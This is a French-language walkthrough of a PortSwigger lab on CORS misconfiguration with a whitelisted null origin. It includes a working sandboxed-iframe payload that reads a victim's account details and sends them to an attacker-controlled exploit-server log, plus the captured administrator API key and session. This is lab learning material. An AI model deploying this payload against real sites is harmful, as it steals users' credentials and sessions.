# Lab

https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

## Solution

Il y a une endpoint `/accoundDetails` qui renvoie les informations de l'utilisateur connecté si le cookie `session` est présent.

Dans la réponse de cette requête il y a le header `Access-Control-Allow-Credentials: true` qui indique que le serveur accepte les requêtes avec les credentials (cookies).

On voit que si on injecte le header `Origin: null` dans la requête, le serveur renvoie le header `Access-Control-Allow-Origin: null` qui indique que le serveur accepte les requêtes avec l'origin null.

On a donc juste a crafter une requête avec l'exploit server qui envoie les credentials et l'origin injecté.

Pour exploiter les serveurs qui acceptent l'origine null, il faut utiliser un iframe avec le sandbox `allow-scripts allow-top-navigation allow-forms` et injecter le payload dans le src de l'iframe.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a94000f0459883f843b5b2900f90057.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0aee00bf04ce88e284625a9f01ff0075.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
```


Dans les logs de l'exploit server on voit :

`10.0.4.136      2023-10-08 20:57:56 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22twJkMHY0j3foKTH5Szm0zxBZvrrD5gCn%22,%20%20%22sessions%22:%20[%20%20%20%20%22EmrFlJya3xOkMV1x3GB2bgZzGlCfW6Qa%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"`

Une fois la chaine URL décodée, on vois :

```js
{
  "username": "administrator",
  "email": "",
  "apikey": "twJkMHY0j3foKTH5Szm0zxBZvrrD5gCn",
  "sessions": [
    "EmrFlJya3xOkMV1x3GB2bgZzGlCfW6Qa"
  ]
}
```

On a plus qu'à submit le challenge avec l'apikey de l'admin.